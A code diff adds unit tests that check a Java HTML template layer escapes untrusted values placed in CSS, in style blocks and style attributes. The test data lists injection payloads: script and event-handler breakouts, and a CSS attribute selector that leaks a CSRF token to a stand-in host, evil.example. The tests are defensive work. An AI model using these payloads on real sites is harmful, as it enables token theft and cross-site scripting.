@@ -519,6 +519,69 @@ class BraceHtmlOutputTest {
         assertEquals("plain", BraceHtmlOutput.decodeReferences("plain"));
     }
 
+    // --- L7 (2026-11): CSS ---
+
+    @Test
+    void plainValuesInCssAreUnchanged() {
+        for (String x : List.of("red", "#ff0000", "50%", "1.5em", "-3px solid", "a_b-c", "café", "")) {
+            String html = both("xssStyle", Map.of("x", x));
+            assertTrue(html.contains("<style id=\"st1\">.a { color: " + x + "; }</style>"), html);
+            assertTrue(html.contains("<style id=\"st2\">.b::after { content: \"" + x + "\"; }</style>"), html);
+            assertTrue(html.contains("<Style id=\"st3\">.c-" + x + " { top: 0 }</Style>"), html);
+            assertTrue(html.contains("<div id=\"st4\" style=\"color: " + x + "\">"), html);
+            assertTrue(html.contains("<div id=\"st6\" style=\"" + x + "\">"), html);
+            assertTrue(html.contains("<div id=\"st7\" style=\"width: " + x + "\">"), html);
+        }
+    }
+
+    @Test
+    void dataInCssCantLeaveItsValue() {
+        // Only HTML-escaped before: a value could close the rule and add its own, such as an
+        // attribute selector that leaks a hidden field one character at a time.
+        for (String x : List.of(
+                "red; } input[name=_csrf][value^=a] { background: url(//evil.example/a) } .x {",
+                "red;background:url(//evil.example/x)", "x\" onmouseover=\"alert(1)", "x' onmouseover='alert(1)",
+                "</style><script>alert(1)</script>", "</Style><script>alert(1)</script>", "expression(alert(1))",
+                "\\3b color\\3a red", "a\nb", "/* */ @import 'x';", "<!-- -->", "a,b", "\u0000")) {
+            String html = both("xssStyle", Map.of("x", x));
+            String e = BraceHtmlOutput.escapeCss(x);
+            assertTrue(e.matches("[A-Za-z0-9 #%._\\\\-]*"), "escaped to plain characters and hex escapes: " + e);
+            if (!x.equals("\u0000")) assertEquals(x, cssUnescape(e), "a CSS parser reads the data back: " + e);
+            assertTrue(html.contains("<style id=\"st1\">.a { color: " + e + "; }</style>"), html);
+            assertTrue(html.contains("<style id=\"st2\">.b::after { content: \"" + e + "\"; }</style>"), html);
+            assertTrue(html.contains("<Style id=\"st3\">.c-" + e + " { top: 0 }</Style>"), html);
+            assertTrue(html.contains("<div id=\"st4\" style=\"color: " + e + "\">"), html);
+            assertTrue(html.contains("<div id=\"st5\" style='background-image: url(\"" + e + "\")'>"), html);
+            assertTrue(html.contains("<div id=\"st6\" style=\"" + e + "\">"), html);
+            assertTrue(html.contains("<div id=\"st7\" style=\"width: " + e + "\">"), html);
+            assertFalse(html.contains("<script>"), html);
+            assertFalse(Pattern.compile("<[^>]*\\sonmouseover=[\"']").matcher(html).find(), html);
+            // Everything else on the page is as before.
+            assertTrue(html.contains("<p id=\"st8\" class=\"" + attrEscaped(x) + "\">"), html);
+        }
+        assertEquals("a\\3b b\\7d ", BraceHtmlOutput.escapeCss("a;b}"));
+        assertEquals("\\fffd ", BraceHtmlOutput.escapeCss("\u0000"));
+        // A URL in a quoted url("...") still works: the CSS parser undoes the escapes in a string.
+        String html = both("xssStyle", Map.of("x", "https://example.com/a.png?b=1"));
+        assertTrue(html.contains("url(\"https\\3a \\2f \\2f example.com\\2f a.png\\3f b\\3d 1\")"), html);
+    }
+
+    private static String cssUnescape(String css) {
+        var m = Pattern.compile("\\\\([0-9a-f]{1,6}) ").matcher(css);
+        var out = new StringBuilder();
+        while (m.find()) m.appendReplacement(out, java.util.regex.Matcher.quoteReplacement(
+            Character.toString(Integer.parseInt(m.group(1), 16))));
+        m.appendTail(out);
+        return out.toString();
+    }
+
+    /** JTE's attribute escaping. */
+    private static String attrEscaped(String value) {
+        var out = new gg.jte.output.StringOutput();
+        gg.jte.html.escape.Escape.htmlAttribute(value, out);
+        return out.toString();
+    }
+
     // --- the tokenizer, driven directly ---
 
     /** Template text, or (with a tag) a ${...} and the context JTE reports for it. */
